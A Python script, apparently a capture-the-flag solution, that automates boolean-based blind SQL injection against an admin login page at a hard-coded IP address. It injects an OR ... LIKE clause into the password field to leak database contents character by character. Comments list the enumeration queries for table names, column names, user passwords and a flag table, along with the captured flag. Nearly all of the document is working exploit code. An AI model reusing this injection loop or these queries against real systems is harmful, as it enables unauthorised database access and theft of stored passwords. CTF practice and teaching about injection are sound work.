from requests import *
from termcolor import colored
from pwn import *

"""
SELECT group_concat(table_name separator '|') from information_schema.tables where table_schema != 'information_schema'
SELECT group_concat(password separator '|') from users
SELECT group_concat(column_name separator '|') from information_schema.columns where table_name = 'flag'
SELECT adl from flag
AD{601dc730bb9c5c531d3c8fa10b6ac69d}
"""

URL = 'http://140.115.59.13:9487/admin.php'

printable = range(95,127) + range(48,58)

while True:
    p = raw_input( colored( 'Payload for finding result >' , 'green' ) )
    t = True
    leak = ''
    lo = log.progress('')
    while t :
        for c in printable:
            _data = {
                'user' : 'yuawn' ,
                'password' : '\' OR ({}) LIKE \'{}%\' ESCAPE \'!\'#'.format( p , (leak + chr(c)).replace('_','!_') )
            }
            #print '\' OR ({}) LIKE \'{}%\' ESCAPE \'\\\'#'.format( p , (leak + chr(c)).replace('_','!_') )
            res = post( URL, data = _data )
            if res.content.find('Successful!') > 0:
                leak += chr(c)
                #log.info( leak )
                lo.status(leak)
                break;
            if c == 57:
                t = False
    lo.success( leak )







"""
SELECT table_name from information_schema.tables where table_schema != 'information_schema'
SELECT group_concat(table_name  separator '|') from information_schema.tables where table_schema != 'information_schema'
SELECT table_name from information_schema.tables where table_schema != 'information_schema' and table_name != 'users'
SELECT column_name from information_schema.columns where table_name = 'flag'
SELECT adl from flag
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_SCHEMA='dbName'
"""
